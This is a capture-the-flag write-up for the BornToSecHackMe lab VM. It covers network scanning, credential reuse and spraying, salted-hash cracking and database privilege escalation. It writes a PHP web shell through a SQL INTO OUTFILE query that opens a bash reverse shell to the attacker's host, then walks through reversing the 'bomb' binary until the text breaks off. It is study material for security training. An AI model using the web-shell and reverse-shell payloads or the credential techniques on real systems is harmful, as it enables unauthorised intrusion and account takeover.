# Finding the machine's IP

## Finding the right interface

To find the interface to scan with `nmap`, use `ip a` to reveal all interfaces and their IP addresses / masks.

### libvirt

Virtual interfaces created using `libvirt` will have a name like `virbrX` or `virbrX-nic`.

### virtualbox

If you're using VirtualBox and a host-only network, the interface will be named `vboxnetX`.

## Scanning the network

```
vboxnet0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 0a:00:27:00:00:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.1/24 brd 192.168.56.255 scope global vboxnet0
       valid_lft forever preferred_lft forever
    inet6 fe80::800:27ff:fe00:0/64 scope link proto kernel_ll 
       valid_lft forever preferred_lft forever
```

Here the address mask is `192.168.56.1/24`, using `nmap` we can scan the network for hosts:

```sh
$ nmap -sn 192.168.56.1/24
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-15 21:52 CET
Nmap scan report for 192.168.56.1
Host is up (0.00016s latency).
Nmap scan report for 192.168.56.101
Host is up (0.00052s latency).
```

Since `.1` is the gateway, we can assume that `.101` is our VM.

# Scanning the network

```sh
$ nmap -p- 192.168.56.1/24
Nmap scan report for 192.168.56.101
Host is up (0.00016s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

So there's a lot of services running here.

# HTTPS

Fuzzing the HTTPS service using `ffuf -w fuzz-Bo0oM.txt -u https://192.168.56.101/FUZZ -mc 200,301,302,307,401,403,405,500` reveals multiple endpoints :

```
cgi-bin/                [Status: 403, Size: 291, Words: 21, Lines: 11]
forum/                  [Status: 200, Size: 4984, Words: 312, Lines: 81]
phpmyadmin/             [Status: 200, Size: 7530, Words: 938, Lines: 127]
phpmyadmin/index.php    [Status: 200, Size: 7530, Words: 938, Lines: 127]
server-status/          [Status: 403, Size: 297, Words: 21, Lines: 11]
webmail/src/configtest.php [Status: 403, Size: 309, Words: 21, Lines: 11]
webmail/                [Status: 302, Size: 0, Words: 1, Lines: 1]
```

## Forum

Going into the forum, there are multiple posts made, one called "Probleme login ?" by `lmezard`.

The content of the post seems to be a section of a `/var/log/auth.log` file, but there's a line that's a bit weird:
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

It seems like someone made a mistake when writing the username, and pasted the password instead. The password is `!q\]Ej?*5K5cy*AJ`.

After that, the next user to log-in is `lmezard`, so we can try to spray the password on that user, on every services the VM hosts.

| Service | Result |
|---------|--------|
| SSH     | ❌ |
| FTP     | ❌ |
| Webmail | ❌ |
| phpMyAdmin | ❌ |
| Forum | ✅ |

The forum works, nothing special to see, but in the user's profile, there's an email address: `laurie@borntosec.net`

## SquirrelMail

Attempting to log into SquirrelMail with that email address and the password we found earlier works, and we can see an email from `qudevide@mail.borntosec.net` with the subject `DB Access`, it contains a username:password combo for.. the database.

`root/Fg-'kKXBj87E:aJ$`

The other inboxes (Trash, Sent, Drafts) are empty.

We can login to phpMyAdmin with the credentials we found.

## phpMyAdmin

| Table name | Content |
|------------|---------|
| `mlf2_banlists` | Empty |
| `mlf2_categories` | Empty |
| `mlf2_entries` | Posts / replies |
| `mlf2_entries_cache` | Cache for the posts |
| `mlf2_logincontrol` | Empty |
| `mlf2_pages` | Empty |
| `mlf2_settings` | `MyLittleForum` settings |
| `mlf2_smilies` | Configured aliases for smilies (we don't care) |
| `mlf2_userdata` | ID, type, password hash, email, misc. |
| `mlf2_userdata_cache` | Empty |
| `mlf2_useronline` | List of users currently online (we don't care) |

We can escalate the user `lmezard` to admin by changing the `type` field in `mlf2_userdata` from `0` to `2`.

| Type number | Description |
|-------------|-------------|
| `0` | User |
| `1` | Moderator |
| `2` | Admin |
| Something else | Defaults to User |


# Reversing forum's hashes

Looking at MyLittleForum's source code

```php
function is_pw_correct($pw,$hash)
 {
  if(strlen($hash)==50) // salted sha1 hash with salt
   {
    $salted_hash = substr($hash,0,40);
    $salt = substr($hash,40,10);
    if(sha1($pw.$salt)==$salted_hash) return true;
    else return false;
   }
  elseif(strlen($hash)==32) // md5 hash generated in an older version
   {
    if($hash == md5($pw)) return true;
    else return false;
   }
  else return false;
 }
```

It seems like the first 40 characters are the hash, and the last 10 are the salt.

The forum uses the `sha1` algorithm. To know how to reverse it, we will try to get the hash from the password we found.

In the database the stored hash is : `0171e7dbcbf4bd21a732fa859ea98a2950b4f8aa1e5365dc90`

The hash is : `0171e7dbcbf4bd21a732fa859ea98a2950b4f8aa`, and the salt should be : `1e5365dc90`.

```sh
$ echo -n '!q\]Ej?*5K5cy*AJ1e5365dc90' | sha1sum
0171e7dbcbf4bd21a732fa859ea98a2950b4f8aa
```

Doing the same (reverse) operation with the `admin` user :

The hash is : `ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0`, and the salt is : `516d551c28`.

Let's try to use `rockyou.txt` wordlist along with `hashcat` to crack the password.

```sh
# Concatenate the salt to each word in the wordlist
# because I don't know how to do it with hashcat :^)
$ sed 's/$/516d551c28/' rockyou.txt > rockyou-salted.txt
$ hashcat -m 100 -a 0 -O -o cracked.txt ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0 rockyou-salted.txt
Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 100 (SHA1)
Hash.Target......: ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0
Time.Started.....: Wed Nov 15 23:27:08 2023 (1 sec)
Time.Estimated...: Wed Nov 15 23:27:09 2023 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (rockyou-salted.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 14646.4 kH/s (0.25ms) @ Accel:256 Loops:1 Thr:128 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14343901/14343901 (100.00%)
Rejected.........: 28307/14343901 (0.20%)
Restore.Point....: 14343901/14343901 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[30323536313432363535313664353531633238] -> $HEX[042a0337c2a156616d6f73210335313664353531633238]
Hardware.Mon.#1..: Temp: 31c Fan:  0% Util: 19% Core:2520MHz Mem:10501MHz Bus:16

Started: Wed Nov 15 23:27:03 2023
Stopped: Wed Nov 15 23:27:10 2023
```

Basically we took the L here, it's not in the wordlist.
## Getting a reverse shell

```
SELECT '<?php system("bash -c \'bash -i >& /dev/tcp/192.168.56.1/12345 0>&1\'") ?>' into outfile "/var/www/forum/templates_c/revshell.php"
```

```sh
curl -k 'https://192.168.56.103/forum/templates_c/revshell.php'
```

```sh
$ nc -lp 12345
www-data@BornToSecHackMe:/var/www/forum/templates_c$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Discovering

We can try to take a look at home directories

```sh
www-data@BornToSecHackMe:/var/www/forum/templates_c$ ls -la /home/
total 0
drwxrwx--x 9 www-data             root                 126 Oct 13  2015 .
drwxr-xr-x 1 root                 root                 200 Nov 16 15:20 ..
drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
www-data@BornToSecHackMe:/var/www/forum/templates_c$ cd /home/LOOKATME
www-data@BornToSecHackMe:/home/LOOKATME$ ls -la
total 1
drwxr-x--- 2 www-data www-data  31 Oct  8  2015 .
drwxrwx--x 9 www-data root     126 Oct 13  2015 ..
-rwxr-x--- 1 www-data www-data  25 Oct  8  2015 password
www-data@BornToSecHackMe:/home/LOOKATME$ cat password
lmezard:G!@M6f4Eatau{sF"
```

New credentials, let's try them into `ssh`

```sh
ssh lmezard@192.168.56.103
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
lmezard@192.168.56.103's password: 
Permission denied, please try again.
lmezard@192.168.56.103's password: 
Permission denied, please try again.
lmezard@192.168.56.103's password: 
lmezard@192.168.56.103: Permission denied (publickey,password).
```

Not working, let's try in `ftp` ?

```sh
$ ftp
ftp> o 192.168.56.103
Connected to 192.168.56.103.
220 Welcome on this server
Name (192.168.56.103:molly): lmezard
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files
ftp> ls
229 Entering Extended Passive Mode (|||56806|).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp> get README
local: README remote: README
229 Entering Extended Passive Mode (|||63361|).
150 Opening BINARY mode data connection for README (96 bytes).
100% |*************************************|    96        1.60 MiB/s    00:00 ETA
226 Transfer complete.
96 bytes received in 00:00 (61.75 KiB/s)
ftp> get fun
local: fun remote: fun
229 Entering Extended Passive Mode (|||49228|).
150 Opening BINARY mode data connection for fun (808960 bytes).
100% |*************************************|   790 KiB   58.87 MiB/s    00:00 ETA
226 Transfer complete.
808960 bytes received in 00:00 (44.83 MiB/s)
```


### Exploring the FTP content

#### `README` file

> Complete this little challenge and use the result as password for user 'laurie' to login in ssh

#### `fun` file

```sh
$ file fun
fun: POSIX tar archive (GNU)
$ tar xf fun
$ ls
ft_fun/  fun  README
$ ls -la ft_fun/
...
$ find . -name '*.pcap' | wc -l
750
```

There's 750 `.pcap` files in this archive, using `file` on them reveal that they're all fake, and are actually `ASCII text` files, some of them are recognized as `C source` files.

Each of these file has a body, that seems to be a part of C code, ending with a comment in C style, with a number in it.
 
```c
	printf("Hahahaha Got you!!!\n");

//file91
```
__ZIFMI.pcap__

So we want to find each file that has a comment ending with `//fileX`, and concatenate them in the right order.

```py
from glob import glob
import re
import os

FILE_NO_RE = re.compile(r"//file(\d+)")

file_dict = {}
for f in glob("*.pcap"):
   with open(f, "r") as txt:
      content = txt.read()
      file_no = FILE_NO_RE.search(content).group(1)
      # remove the comment
      content = FILE_NO_RE.sub("", content)
      file_dict[file_no] = content

data = ""

for i in range(1, 751): # Read the files in the right order, and concatenate them
   data += file_dict[str(i)]

with open("cat.c", "w+") as cat:
   cat.write(data)

os.system("gcc cat.c -o /tmp/cat")
os.system("/tmp/cat > cat.txt")
os.remove("/tmp/cat")
os.remove("cat.c")

with open("cat.txt", "r") as cat:
   print(cat.read())

os.remove("cat.txt")
```

And we get this output :

> MY PASSWORD IS: Iheartpwnage
> Now SHA-256 it and submit

```sh
$ echo -n 'Iheartpwnage' | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

### The `laurie` user

We can now try to log in as `laurie` using the password we found earlier.

```sh
$ ssh laurie@192.168.56.103
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password: 
laurie@BornToSecHackMe:~$ id
uid=1003(laurie) gid=1003(laurie) groups=1003(laurie)
laurie@BornToSecHackMe:~$
```

Great! What do we do now?

```sh
laurie@BornToSecHackMe:~$ ls -la
total 34
drwxr-x--- 3 laurie   laurie   143 Oct 15  2015 .
drwxrwx--x 9 www-data root     126 Oct 13  2015 ..
-rwxr-x--- 1 laurie   laurie     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 laurie   laurie   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 laurie   laurie  3489 Oct 13  2015 .bashrc
-rwxr-x--- 1 laurie   laurie 26943 Oct  8  2015 bomb
drwx------ 2 laurie   laurie    43 Oct 15  2015 .cache
-rwxr-x--- 1 laurie   laurie   675 Oct  8  2015 .profile
-rwxr-x--- 1 laurie   laurie   158 Oct  8  2015 README
-rw------- 1 laurie   laurie   606 Oct 13  2015 .viminfo
```

| File | Summary |
|------|---------|
| `.bash_history` | Empty |
| `.bash_logout` | Nothing special |
| `.bashrc` | Nothing special |
| `bomb` | `bomb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.0.0, not stripped` |
| `.cache` | Contains an empty `motd.legal-displayed` file |
| `.profile` | Nothing special |
| `README` | Specific note about what to do with `bomb` |
| `.viminfo` | Nothing special |

```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4
```


### Reverse engineering the `bomb` binary

Let's get the binary on our computer and reverse it.

```sh
$ scp laurie@192.168.56.101:bomb .
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password: 
bomb 100%   26KB  30.4MB/s   00:00
```

Great, we will use `ghidra` to reverse it.

#### `main` function

```c
int main(int argc, char **argv)
{
  char *input;
  FILE *infile;

  if (argc == 1) {
    infile = stdin;
  }
  else if (argc != 2) {
     printf("Usage: %s [<input_file>]\n",argv[1]);
     exit(8);
  } else {
   infile = fopen((char *)argv[1], "r");
  }
  if (!infile) {
      printf("%s: Error: Couldn\'t open %s\n",*argv,argv[1]);
      exit(8);
  }
  initialize_bomb(argv);
  printf("Welcome this is my little bomb !!!! You have 6 stages with\n");
  printf("only one life good luck !! Have a nice day!\n");
  input = read_line();
  phase_1(input);
  phase_defused();
  printf("Phase 1 defused. How about the next one?\n");
  input = read_line();
  phase_2(input);
  phase_defused();
  printf("That\'s number 2.  Keep going!\n");
  input = read_line();
  phase_3(input);
  phase_defused();
  printf("Halfway there!\n");
  input = read_line();
  phase_4(input);
  phase_defused();
  printf("So you got that one.  Try this one.\n");
  input = read_line();
  phase_5(input);
  phase_defused();
  printf("Good work!  On to the next...\n");
  input = read_line();
  phase_6(input);
  phase_defused();
  return 0;
}
```

So it seems like the function that we're interested in is every `phase_X` function.

#### `phase_1` function

```c
void phase_1(char *s)
{
  if (strings_not_equal(s, "Public speaking is very easy.") != 0) {
    explode_bomb();
  }
}
```

So we need to give the string `Public speaking is very easy.` to the program.

#### `phase_2` function

```c
void phase_2(char *s)
{
  char buffer[7];
  read_six_numbers(s, buffer + 1);
  if (buffer[1] != 1) {
    explode_bomb();
  }
  for (int i = 1; i < 7; i++) {
    if (buffer[i + 1] != (i + 1) * buffer[i]) {
      explode_bomb();
    }
  }
  return;
}

void read_six_numbers(char *input, char *buffer)
{
  if (sscanf(input,"%d %d %d %d %d %d", buffer, buffer + 4, buffer + 8, buffer + 12, buffer + 16, buffer + 20) < 6) {
    explode_bomb();
  }
}
```

So we have to write 6 numbers to `stdin` separated by spaces. The first one should be `1`, and the next ones should be the previous number multiplied by the index of the number in the list.

- `1`
- `1 * 2 = 2`
- `2 * 3 = 6`
- `6 * 4 = 24`
- `24 * 5 = 120`
- `120 * 6 = 720`

Correct input : `1 2 6 24 120 720`

#### `phase_3` function

```c
void phase_3(char *input)
{
  char c;
  uint x;
  char y;
  int z;

  if (sscanf(input,"%d %c %d", &x, &y, &z) < 3) {
    explode_bomb();
  }
  switch(x) {
   case 0:
      c = 'q';
      if (z != 777) {
         explode_bomb();
      }
      break;
   case 1:
      c = 'b';
      if (z != 214) {
         explode_bomb();
      }
      break;
   case 2:
      c = 'b';
      if (z != 755) {
         explode_bomb();
      }
      break;
   case 3:
      c = 'k';
      if (z != 251) {
         explode_bomb();
      }
      break;
   case 4:
      c = 'o';
      if (z != 160) {
         explode_bomb();
      }
      break;
   case 5:
      c = 't';
      if (z != 458) {
         explode_bomb();
      }
      break;
   case 6:
      c = 'v';
      if (z != 780) {
         explode_bomb();
      }
      break;
   case 7:
      c = 'b';
      if (z != 524) {
         explode_bomb();
      }
      break;
   default:
      c = 'x';
      explode_bomb();
   }
   if (c != y) {
      explode_bomb();
   }
  return;
}
```

The readme's hint tells us the second input should be `b`, the only case where it's `b` is when `x` is `1`, and `z` should be `214`.

Correct input : `1 b 214`

#### `phase_4` function

```c
int func4(int n)
{
  int x;
  int y;
  
  if (n < 2) {
    y = 1;
  }
  else {
    x = func4(n + -1);
    y = func4(n + -2);
    y += x;
  }
  return y;
}

void phase_4(char *input)
{
  if ((sscanf(input,"%d",&x) != 1) || (x < 1)) {
    explode_bomb();
  }
  if (func4(x) != 55) {
    explode_bomb();
  }
  return;
}
```

The `func4` function computes the nth number of the Fibonacci sequence. To get `55` as a result, we need to give `9` as input.

#### `phase_5` function

```c

char *chars = "isrveawhobpnutfg";

void phase_5(char *input)
{
  char *buffer[6];
  if (string_length(input) != 6) {
    explode_bomb();
  }
  for (int i = 0; i < 6; i++) {
     buffer[i] = charset[str[i] & 0x0f];
  }
  buffer[6] = '\0';
  if (strings_not_equal(buffer, "giants") != 0) {
    explode_bomb();
  }
  return;
}
```

This is a basic cipher, that uses the `chars` string as a key, and the input as the ciphered text.

Every character of the input is `AND`'d with `0x0f`, which is `15` in decimal, so we can get the index of the character in the `chars` string.

We have to find the input that when `AND`'d with `0x0f` gives us the following indexes : `15 0 5 11 13 1`.

```py
import string

MASK = 0x0f
CHARS = "isrveawhobpnutfg"
TARGETS = [15, 0, 5, 11, 13, 1]

for i, target_index in enumerate(TARGETS):
   print("-" * 15 + " Candidate(s) for char #{} ".format(i) + "-" * 15)
   for char in string.ascii_lowercase:
      index = ord(char) & MASK
      if index == target_index:
         print(char, end="")
   print()
```

This gives us the following output :

```
--------------- Candidate(s) for char #0 ---------------
o
--------------- Candidate(s) for char #1 ---------------
p
--------------- Candidate(s) for char #2 ---------------
eu
--------------- Candidate(s) for char #3 ---------------
k
--------------- Candidate(s) for char #4 ---------------
m
--------------- Candidate(s) for char #5 ---------------
aq
```

Meaning that we have that we have these valid strings :

1. `opekma`
2. `opekmq`
3. `opukma`
4. `opukmq`

#### `phase_6` function

Static analysis seemed to be a bit hard, and I'm lazy, so I just used `gdb` to get the password.

```
   0x08048d98 <+0>:     push   ebp
   0x08048d99 <+1>:     mov    ebp,esp
   0x08048d9b <+3>:     sub    esp,0x4c
   0x08048d9e <+6>:     push   edi
   0x08048d9f <+7>:     push   esi
   0x08048da0 <+8>:     push   ebx
   0x08048da1 <+9>:     mov    edx,DWORD PTR [ebp+0x8]
   0x08048da4 <+12>:    mov    DWORD PTR [ebp-0x34],0x804b26c
   0x08048dab <+19>:    add    esp,0xfffffff8
   0x08048dae <+22>:    lea    eax,[ebp-0x18]
   0x08048db1 <+25>:    push   eax
   0x08048db2 <+26>:    push   edx
   0x08048db3 <+27>:    call   0x8048fd8 <read_six_numbers>
   0x08048db8 <+32>:    xor    edi,edi
   0x08048dba <+34>:    add    esp,0x10
   0x08048dbd <+37>:    lea    esi,[esi+0x0]
   0x08048dc0 <+40>:    lea    eax,[ebp-0x18]
   0x08048dc3 <+43>:    mov    eax,DWORD PTR [eax+edi*4]
   0x08048dc6 <+46>:    dec    eax
   0x08048dc7 <+47>:    cmp    eax,0x5
   0x08048dca <+50>:    jbe    0x8048dd1 <phase_6+57>
   0x08048dcc <+52>:    call   0x80494fc <explode_bomb>
   0x08048dd1 <+57>:    lea    ebx,[edi+0x1]
   0x08048dd4 <+60>:    cmp    ebx,0x5
   0x08048dd7 <+63>:    jg     0x8048dfc <phase_6+100>
   0x08048dd9 <+65>:    lea    eax,[edi*4+0x0]
   0x08048de0 <+72>:    mov    DWORD PTR [ebp-0x38],eax
   0x08048de3 <+75>:    lea    esi,[ebp-0x18]
   0x08048de6 <+78>:    mov    edx,DWORD PTR [ebp-0x38]
   0x08048de9 <+81>:    mov    eax,DWORD PTR [edx+esi*1]
   0x08048dec <+84>:    cmp    eax,DWORD PTR [esi+ebx*4]
   0x08048def <+87>:    jne    0x8048df6 <phase_6+94>
   0x08048df1 <+89>:    call   0x80494fc <explode_bomb>
   0x08048df6 <+94>:    inc    ebx
   0x08048df7 <+95>:    cmp    ebx,0x5
   0x08048dfa <+98>:    jle    0x8048de6 <phase_6+78>
   0x08048dfc <+100>:   inc    edi
   0x08048dfd <+101>:   cmp    edi,0x5
   0x08048e00 <+104>:   jle    0x8048dc0 <phase_6+40>
   0x08048e02 <+106>:   xor    edi,edi
   0x08048e04 <+108>:   lea    ecx,[ebp-0x18]
   0x08048e07 <+111>:   lea    eax,[ebp-0x30]
   0x08048e0a <+114>:   mov    DWORD PTR [ebp-0x3c],eax
   0x08048e0d <+117>:   lea    esi,[esi+0x0]
   0x08048e10 <+120>:   mov    esi,DWORD PTR [ebp-0x34]
   0x08048e13 <+123>:   mov    ebx,0x1
   0x08048e18 <+128>:   lea    eax,[edi*4+0x0]
   0x08048e1f <+135>:   mov    edx,eax
   0x08048e21 <+137>:   cmp    ebx,DWORD PTR [eax+ecx*1]
   0x08048e24 <+140>:   jge    0x8048e38 <phase_6+160>
   0x08048e26 <+142>:   mov    eax,DWORD PTR [edx+ecx*1]
   0x08048e29 <+145>:   lea    esi,[esi+eiz*1+0x0]
   0x08048e30 <+152>:   mov    esi,DWORD PTR [esi+0x8]
   0x08048e33 <+155>:   inc    ebx
   0x08048e34 <+156>:   cmp    ebx,eax
   0x08048e36 <+158>:   jl     0x8048e30 <phase_6+152>
   0x08048e38 <+160>:   mov    edx,DWORD PTR [ebp-0x3c]
   0x08048e3b <+163>:   mov    DWORD PTR [edx+edi*4],esi
   0x08048e3e <+166>:   inc    edi
   0x08048e3f <+167>:   cmp    edi,0x5
   0x08048e42 <+170>:   jle    0x8048e10 <phase_6+120>
   0x08048e44 <+172>:   mov    esi,DWORD PTR [ebp-0x30]
   0x08048e47 <+175>:   mov    DWORD PTR [ebp-0x34],esi
   0x08048e4a <+178>:   mov    edi,0x1
   0x08048e4f <+183>:   lea    edx,[ebp-0x30]
   0x08048e52 <+186>:   mov    eax,DWORD PTR [edx+edi*4]
   0x08048e55 <+189>:   mov    DWORD PTR [esi+0x8],eax
   0x08048e58 <+192>:   mov    esi,eax
   0x08048e5a <+194>:   inc    edi
   0x08048e5b <+195>:   cmp    edi,0x5
   0x08048e5e <+198>:   jle    0x8048e52 <phase_6+186>
   0x08048e60 <+200>:   mov    DWORD PTR [esi+0x8],0x0
   0x08048e67 <+207>:   mov    esi,DWORD PTR [ebp-0x34]
   0x08048e6a <+210>:   xor    edi,edi
   0x08048e6c <+212>:   lea    esi,[esi+eiz*1+0x0]
   0x08048e70 <+216>:   mov    edx,DWORD PTR [esi+0x8]
   0x08048e73 <+219>:   mov    eax,DWORD PTR [esi]
   0x08048e75 <+221>:   cmp    eax,DWORD PTR [edx]
   0x08048e77 <+223>:   jge    0x8048e7e <phase_6+230>
   0x08048e79 <+225>:   call   0x80494fc <explode_bomb>
   0x08048e7e <+230>:   mov    esi,DWORD PTR [esi+0x8]
   0x08048e81 <+233>:   inc    edi
   0x08048e82 <+234>:   cmp    edi,0x4
   0x08048e85 <+237>:   jle    0x8048e70 <phase_6+216>
   0x08048e87 <+239>:   lea    esp,[ebp-0x58]
   0x08048e8a <+242>:   pop    ebx
   0x08048e8b <+243>:   pop    esi
   0x08048e8c <+244>:   pop    edi
   0x08048e8d <+245>:   mov    esp,ebp
   0x08048e8f <+247>:   pop    ebp
   0x08048e90 <+248>:   ret
```

There's a global variable `node1`, let's get its value

```c
gef➤  p (int)node1
$1 = 253
gef➤  p (int)node2
$2 = 725
gef➤  p (int)node3
$3 = 301
gef➤  p (int)node4
$4 = 997
gef➤  p (int)node5
$5 = 212
gef➤  p (int)node6
$6 = 432
gef➤  p (int)node7
No symbol "node7" in current context.
```

And from what I've seen quickly in the static analysis :

```c
for (int i = 0; i < 6; i++) {
   if (inputs[i] < 1 || inputs[i] > 6) {
      explode_bomb();
   }
   for (int j = i + 1; j < 6; j++) {
      if (inputs[i] == inputs[j]) {
         explode_bomb();
      }
   }
}
```

This seems like this bit of code checks whether the 6 numbers we've passed to the program are between `1` and `6`, and that there's no duplicates.

I added a breakpoint at `0x08048e79` which is `phase_6`'s last call to `explode_bomb`, tried to feed `6 5 4 3 2 1` to the program, and it triggered the breakpoint.

The `node1-6` globals were unchanged. The `README`'s hint starts with `4`, and in the assembly we can see that :

```
0x08048e70 <+216>:   mov    edx,DWORD PTR [esi+0x8]
0x08048e73 <+219>:   mov    eax,DWORD PTR [esi]
0x08048e75 <+221>:   cmp    eax,DWORD PTR [edx]
0x08048e77 <+223>:   jge    0x8048e7e <phase_6+230>
0x08048e79 <+225>:   call   0x80494fc <explode_bomb>
0x08048e7e <+230>:   mov    esi,DWORD PTR [esi+0x8]
0x08048e81 <+233>:   inc    edi
0x08048e82 <+234>:   cmp    edi,0x4
0x08048e85 <+237>:   jle    0x8048e70 <phase_6+216>
```

This loop checks that the `nodeX` globals are in ascending order, so we can deduce that the input we pass is the new order of the `nodeX` globals.

So, the correct new order is `4 2 6 3 1 5`.

#### Full password

1. `Public speaking is very easy.`
2. `1 2 6 24 120 720`
3. `1 b 214`
4. `9`
5. any of `opekma`, `opekmq`, `opukma`, `opukmq`
6. `4 2 6 3 1 5`

```sh
echo -e "Public speaking is very easy.\n1 2 6 24 120 720\n1 b 214\n9\nopekma\n4 2 6 3 1 5" | ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Congratulations! You've defused the bomb!
```

Great! Now we just have to test what is the correct combination for the 5th phase.

1. `Publicspeakingisveryeasy.126241207201b2149opekma426315`
2. `Publicspeakingisveryeasy.126241207201b2149opekmq426315`
3. `Publicspeakingisveryeasy.126241207201b2149opukma426315`
4. `Publicspeakingisveryeasy.126241207201b2149opukmq426315`

And, none of them worked.

#### `phase_defused` function

The `phase_defused` function seems to be more than just a "congratulations" message.

```c
void phase_defused(void)
{
  int n;
  char *s2[80];
  if (num_input_strings == 6) {
    if (sscanf(input_strings + 240,"%d %s", &n, s2) == 2) {
      if (strings_not_equal(s2,"austinpowers") == 0) {
        printf("Curses, you\'ve found the secret phase!\n");
        printf("But finding it and solving it are quite different...\n");
        secret_phase();
      }
    }
    printf("Congratulations! You\'ve defused the bomb!\n");
  }
  return;
}
```

You can see a reference to `num_input_strings` which is incremented by one each time a call to `read_line` is made.

If we're on the 6th phase, the condition `num_input_strings == 6` becomes true, and the program will try to read 2 strings from the `input_strings` buffer, starting at the 240th byte.

But what does the `input_strings` buffer contain?

I added a breakpoint at `read_line` and ran the program, at each `phase_defused` call, I printed the `input_strings` buffer.

```sh
gef➤  x/200s (char *)&input_strings
0x804b680 <input_strings>:      "Public speaking is very easy."
0x804b69e <input_strings+30>:   ""
0x804b69f <input_strings+31>:   ""
...
0x804b6ce <input_strings+78>:   ""
0x804b6cf <input_strings+79>:   ""
0x804b6d0 <input_strings+80>:   "1 2 6 24 120 720"
0x804b6e1 <input_strings+97>:   ""
0x804b6e2 <input_strings+98>:   ""
...
0x804b71e <input_strings+158>:  ""
0x804b71f <input_strings+159>:  ""
0x804b720 <input_strings+160>:  "1 b 214"
0x804b728 <input_strings+168>:  ""
0x804b729 <input_strings+169>:  ""
...
0x804b77a <input_strings+250>:  ""
0x804b77b <input_strings+251>:  ""
gef➤ 
```

Each increment of 80 bytes matches one phase. At index 240, we have the 4th one (240/80 = 5)

```sh
./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9 austinpowers
So you got that one.  Try this one.
opekma
Good work!  On to the next...
4 2 6 3 1 5
Curses, you've found the secret phase!
But finding it and solving it are quite different...
qwoueqwuyieqyuiweuyeqwyuieqwuyie

BOOM!!!
The bomb has blown up.
```

So we have to find what to input to defuse the secret phase.

#### `secret_phase` function

```c
typedef struct s_node { // complete deduction
  int data;
  struct node *head;
  struct node *next;
} t_node;

void secret_phase(void)
{
  char *input;
  long n;

  input = read_line();
  // long int __strtol_internal(const char *__nptr, char **__endptr, int __base, int __group);
  n = __strtol_internal(input, 0, 10, 0);
  if (1000 < n - 1U) {
    explode_bomb();
  }
  n = fun7(n1, n);
  if (n != 7) { // the goal is to have fun7 return 7
    explode_bomb();
  }
  printf("Wow! You\'ve defused the secret stage!\n");
  phase_defused();
  return;
}

int fun7(t_node *n1, long n)
{
  int ret;
  
  if (n1 == NULL) {
    ret = -1;
  }
  else if (n < n1.data) {
    ret = fun7(n1.head, n); // n1 seems to be some kind of linked data struct
    ret = ret * 2;
  }
  else if (n == n1.data) {
    ret = 0;
  }
  else {
    ret = fun7(n1.next, n);
    ret = ret * 2 + 1;
  }
  return ret;
}
```

We now have to find what is in the `n1` variable, and what is the correct input to get `fun7` to return `7`.

I have found these other two globals in the symbols :

- `n21`
